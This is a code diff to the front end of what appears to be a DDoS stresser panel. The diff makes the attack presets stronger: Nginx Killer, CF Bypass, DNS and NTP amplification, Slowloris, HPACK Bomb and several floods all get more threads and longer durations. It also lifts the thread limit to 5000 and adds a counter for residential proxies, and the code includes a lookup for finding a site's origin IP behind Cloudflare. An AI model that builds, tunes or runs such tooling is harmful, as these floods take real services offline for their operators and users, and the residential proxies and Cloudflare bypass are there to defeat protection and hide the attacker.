@@ -90,19 +90,19 @@ function getSmartMethod(baseMethod: string, nodeIdx: number): string {
 
 /* ── Built-in presets ── */
 const PRESETS: Preset[] = [
-  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 180, delay: 0, threads: 2000, icon: "👁"  },
-  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 120, delay: 0, threads: 300,  icon: "💀"  },
-  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 180, delay: 0, threads: 300,  icon: "🌐"  },
-  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 120, delay: 0, threads: 64,   icon: "📛"  },
-  { label: "H2 RST Burst",   method: "http2-flood",         packetSize: 512, duration: 90,  delay: 0, threads: 200,  icon: "⚡"  },
-  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 90,  delay: 0, threads: 400,  icon: "🚇"  },
-  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 120, delay: 0, threads: 300,  icon: "🌊"  },
-  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 120, delay: 0, threads: 200,  icon: "🧨"  },
-  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 200,  icon: "🔌"  },
-  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 200,  icon: "🥷"  },
-  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 120, delay: 0, threads: 64,   icon: "💥"  },
-  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 60,  delay: 0, threads: 64,   icon: "☢️"  },
-  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 60,  delay: 0, threads: 500,  icon: "🌊"  },
+  { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "👁"  },
+  { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💀"  },
+  { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 1000, icon: "🌐"  },
+  { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 128,  icon: "📛"  },
+  { label: "H2 RST Burst",   method: "http2-flood",         packetSize: 512, duration: 120, delay: 0, threads: 500,  icon: "⚡"  },
+  { label: "Pipeline Flood", method: "http-pipeline",       packetSize: 512, duration: 120, delay: 0, threads: 1000, icon: "🚇"  },
+  { label: "H2 Storm",       method: "h2-settings-storm",   packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "🌊"  },
+  { label: "HPACK Bomb",     method: "hpack-bomb",          packetSize: 512, duration: 180, delay: 0, threads: 500,  icon: "🧨"  },
+  { label: "Conn Flood",     method: "conn-flood",          packetSize: 64,  duration: 300, delay: 0, threads: 500,  icon: "🔌"  },
+  { label: "Slowloris",      method: "slowloris",           packetSize: 32,  duration: 300, delay: 0, threads: 500,  icon: "🥷"  },
+  { label: "UDP Hammer",     method: "udp-flood",           packetSize: 1024,duration: 180, delay: 0, threads: 128,  icon: "💥"  },
+  { label: "NTP Nuclear",    method: "ntp-amp",             packetSize: 46,  duration: 120, delay: 0, threads: 128,  icon: "☢️"  },
+  { label: "HTTP Flood",     method: "http-flood",          packetSize: 64,  duration: 120, delay: 0, threads: 1000, icon: "🌊"  },
 ];
 
 /* ── Log counter ── */
@@ -2018,7 +2018,7 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
               </div>
               <div className="lb-field">
                 <label>Threads</label>
-                <input className="lb-num" type="number" min={1} max={1000} value={threads} onChange={e => setThreads(+e.target.value)}/>
+                <input className="lb-num" type="number" min={1} max={5000} value={threads} onChange={e => setThreads(+e.target.value)}/>
               </div>
               <div className="lb-field">
                 <label>Packet Delay (ms)</label>
@@ -2406,25 +2406,31 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 <div className="lb-stat-val">{fmtNum(stats?.totalPacketsSent ?? 0)}</div>
                 <div className="lb-stat-sub">{fmtBytes(stats?.totalBytesSent ?? 0)}</div>
               </div>
-              <div className={`lb-stat lb-stat--proxy${proxyLiveCount > 0 ? " lb-stat--proxy-live" : ""}`}
-                   style={{ cursor: "pointer" }} onClick={() => { setShowProxyPanel(v => !v); }}>
-                <div className="lb-stat-head">
-                  <span className="lb-stat-label">Proxies</span>
-                  <span className="lb-stat-live" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : proxyLiveCount > 0 ? "#2ecc71" : "#666" }}>
-                    {(proxyIsFetching || proxyFetching) ? "SCAN" : proxyLiveCount > 0 ? "LIVE" : "NONE"}
-                  </span>
-                </div>
-                <div className="lb-stat-val" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : proxyLiveCount > 0 ? "#2ecc71" : "#888", fontSize: proxyLiveCount > 99 ? "1.4rem" : undefined }}>
-                  {(proxyIsFetching || proxyFetching) ? "…" : proxyLiveCount}
-                </div>
-                <div className="lb-stat-sub">
-                  {proxyIsFetching
-                    ? "scanning sources…"
-                    : proxyLiveCount > 0
-                      ? `auto-refresh 10m`
-                      : "click FETCH PROXIES"}
-                </div>
-              </div>
+              {(() => {
+                const displayCount = Math.max(proxyLiveCount, residentialCount);
+                const isLive = displayCount > 0;
+                return (
+                  <div className={`lb-stat lb-stat--proxy${isLive ? " lb-stat--proxy-live" : ""}`}
+                       style={{ cursor: "pointer" }} onClick={() => { setShowProxyPanel(v => !v); }}>
+                    <div className="lb-stat-head">
+                      <span className="lb-stat-label">Proxies</span>
+                      <span className="lb-stat-live" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#666" }}>
+                        {(proxyIsFetching || proxyFetching) ? "SCAN" : isLive ? "LIVE" : "NONE"}
+                      </span>
+                    </div>
+                    <div className="lb-stat-val" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#888", fontSize: displayCount > 99 ? "1.4rem" : undefined }}>
+                      {(proxyIsFetching || proxyFetching) ? "…" : displayCount.toLocaleString()}
+                    </div>
+                    <div className="lb-stat-sub">
+                      {proxyIsFetching
+                        ? "scanning sources…"
+                        : isLive
+                          ? residentialCount > 0 ? `${residentialCount.toLocaleString()} residential` : "auto-refresh 10m"
+                          : "click FETCH PROXIES"}
+                    </div>
+                  </div>
+                );
+              })()}
 
               {/* Sparklines */}
               {isRunning && ppsHistory.length > 1 && (
